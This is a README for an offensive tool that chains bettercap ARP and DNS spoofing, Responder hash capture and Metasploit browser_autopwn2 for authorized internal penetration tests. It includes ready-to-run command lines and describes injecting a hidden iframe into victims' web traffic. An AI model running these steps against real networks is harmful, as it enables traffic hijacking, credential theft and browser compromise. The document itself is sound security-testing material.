# mitm-autopwn

Standalone MITM browser autopwn orchestrator for authorized internal network penetration testing. It ties three off the shelf tools into one run behind a three panel TUI and a scope guard.

- bettercap for layer two ARP spoofing, a transparent HTTP proxy with javascript injection, and optional DNS spoofing
- Responder for LLMNR, NBT-NS, and mDNS poisoning with SMB NetNTLM hash capture
- Metasploit browser_autopwn2 for dynamic browser fingerprinting and exploitation

This is orchestration glue plus a scope guard. Every underlying capability lives in the tools above.

## Authorization

Run this only against hosts and segments you are explicitly authorized to test. It performs ARP spoofing, DNS spoofing, credential capture, and client side exploitation against live traffic.

## How it works

On launch the orchestrator runs this sequence.

1. Bootstraps a virtualenv at /opt/mitm-autopwn-venv, installs its python deps, and re-execs into it
2. Confirms root, checks the interface exists and is up, and resolves the paths to bettercap, msfrpcd, and Responder.py
3. Resolves the operator address, expands the target set, and strips operator addresses and the default gateway from it
4. Starts msfrpcd and loads browser_autopwn2 so the serving URL is known
5. Patches Responder.conf to leave only SMB answering, backs up the original, and starts Responder
6. Launches bettercap, enables the injecting proxy, and ARP spoofs only the vetted targets
7. Optionally starts a lure redirector and DNS spoofs a lure domain to it for HTTPS only victims
8. Starts the monitor threads and paints the TUI
9. Restores Responder.conf and tears everything down on ctrl-c

## Components

| File | Role |
| --- | --- |
| orchestrator.py | Entry point, argument parsing, config cache, scope guard, sequencing, teardown |
| system.py | Root check, venv bootstrap, dependency discovery, interface and routing lookups |
| mitm.py | bettercap REST driver, injecting proxy, DNS spoof, lure redirector |
| responder.py | Responder.conf patching with restore, process control, hash and poison parsing |
| msf.py | msfrpcd control, browser_autopwn2 setup, console and session monitoring |
| state.py | Thread safe shared state consumed by the TUI |
| tui.py | Three panel rich live display |

## Requirements

- Linux with root
- python3 with venv, no manual pip step, it self bootstraps on first run
- bettercap
- metasploit-framework, which provides msfrpcd
- Responder, invoked as Responder.py
- iproute2 for the ip command
- plocate or mlocate is optional and is only used to find Responder.py when it is not on PATH

First run needs outbound internet so the venv can install rich, pymetasploit3, and requests.

There is no separate build step. The first run creates the venv and installs the python deps.

## Dependency discovery and caching

On first run each dependency is resolved by PATH first and then by the plocate database as a fallback for Responder.py. Resolved absolute paths are cached in ~/.orchestration_config under a binaries block, and later runs trust a cached path as long as the file still exists. The search only reruns when a cached path is gone.

```json
{
  "binaries": {
    "bettercap": "/usr/bin/bettercap",
    "msfrpcd": "/usr/bin/msfrpcd",
    "responder": "/opt/Responder/Responder.py"
  }
}
```

Hand edit that block to pin a path permanently. A missing dependency that cannot be found exits with a message naming the key to set. It does not auto install.

## Usage

All examples run as root because raw sockets, ARP spoofing, and low port binding require it.

Targeted run against three hosts, injecting into their cleartext HTTP.

```
sudo python3 orchestrator.py -i eth0 -t 10.0.0.10,10.0.0.11,10.0.0.12 --lhost 10.0.0.5
```

Host list from a file.

```
sudo python3 orchestrator.py -i eth0 --hosts-file targets.txt --lhost 10.0.0.5
```

Full subnet, self and gateway stripped automatically. This is loud, use it deliberately.

```
sudo python3 orchestrator.py -i eth0 --full-subnet --lhost 10.0.0.5
```

HTTPS only victims, add a lure domain that DNS spoofs to a local redirector that bounces to the autopwn landing.

```
sudo python3 orchestrator.py -i eth0 -t 10.0.0.10 --lhost 10.0.0.5 --lure-domain updates.corp.local
```

Trim noisy or browser crashing modules out of browser_autopwn2.

```
sudo python3 orchestrator.py -i eth0 -t 10.0.0.10 --lhost 10.0.0.5 --exclude-pattern "android|firefox_pdfjs"
```

## Flags

| Flag | Default | Purpose |
| --- | --- | --- |
| -i, --interface | required | Interface on the target segment |
| -t, --targets | none | Target as CIDR or comma separated hosts |
| --hosts-file | none | File of target hosts, one per line, hash comments allowed |
| --full-subnet | off | Opt in to spoofing the whole interface subnet minus self and gateway |
| --lhost | interface address | Operator address used for callbacks and the serving URL |
| --srvport | 8888 | browser_autopwn2 server port |
| --uripath | update | browser_autopwn2 landing path |
| --exclude-pattern | none | Regex passed to EXCLUDE_PATTERN to drop modules |
| --lure-domain | none | Domain to DNS spoof to the lure redirector for HTTPS only victims |
| --lure-port | 80 | Port the lure redirector binds on the operator address |
| --responder-path | discovered | Explicit path to Responder.py, also written to the cache |
| --msf-pass | autopwn | msfrpcd password |
| --msf-port | 55553 | msfrpcd port |
| --bettercap-port | 8081 | bettercap REST API port |
| --bettercap-user | orchestrator | bettercap REST API user |
| --bettercap-pass | orchestrator | bettercap REST API password |

At least one of --targets, --hosts-file, or --full-subnet is required.

## Delivery model

For cleartext HTTP victims bettercap rewrites HTML responses in flight and injects a hidden one pixel iframe pointing at the autopwn landing, so a normal page view pulls the exploit page in the background.

For HTTPS only victims injection is not possible, so the lure path is the fallback. With --lure-domain set, that name is DNS spoofed to a small redirector bound on the operator address that answers with a 302 to the autopwn landing. It only fires when the victim actually requests the lure domain.

## TUI

Three panels update live.

- Poisoning and hashes shows captured NetNTLM hashes and the LLMNR NBT-NS mDNS poison count
- MITM and delivery shows spoofed host, DNS hit, served, and failed counts, plus a per victim table that separates exploited, served, served then failed, and outright failed page loads
- Sessions shows opened Meterpreter or shell sessions with host, platform, and the exploit that landed them

The header carries phase, uptime, and status. The footer shows the ctrl-c hint and the latest event.

Captured hashes stay in the display. This build does not relay them.

## Scope guard

The operator interface addresses and the default gateway are always removed from the spoof set, so you cannot blackhole your own segment by spoofing the gateway. Anything the guard removes is printed before spoofing starts. Spoofing the full subnet is never implicit and requires --full-subnet.

## Teardown

ctrl-c triggers an idempotent teardown that stops bettercap, Responder, msfrpcd, and the lure redirector, and restores the original Responder.conf from the backup taken at start. Let it finish rather than killing it a second time.

## Tuning and known caveats

- Responder.conf key names shift between versions. The patch assumes the standard section keys. Diff your installed Responder.conf against what the patch writes and adjust if your build differs.
- The hash and poison parsers read Responder stdout, not its database. If your Responder version reformats its console lines the parse patterns will need tuning.
- bettercap event dedup relies on reading then deleting events over the REST API because the timestamps are not monotonic. Repeated event lines mean the delete call is failing, usually a REST credential problem.
- browser_autopwn2 console output is async, so served and failed counts can lag actual page loads by a beat. That is timing, not a stuck run.
- browser_autopwn2 is loud and can crash victim browsers. Use --exclude-pattern to trim modules that do not fit the target browser mix.
- The lure redirector binds the operator address on the lure port while the transparent proxy works on forwarded traffic through iptables. Confirm no local service already holds that port.
- None of this has been exercised against live bettercap, Responder, or msfrpcd yet. Treat the first lab run as the real integration test.

## Troubleshooting

- Exits saying a dependency was not found, install the tool or set its path under binaries in ~/.orchestration_config
- Exits on the interface check, confirm the interface name and that it is up
- No hashes appear, confirm SMB is the only Responder answerer and that poisoning is reaching clients on the segment
- No sessions land, confirm the injected page and the callback host are reachable and that EXCLUDE_PATTERN is not dropping the module the target browser needs
- bettercap will not drive, confirm the REST port is free and the user and pass match what you passed
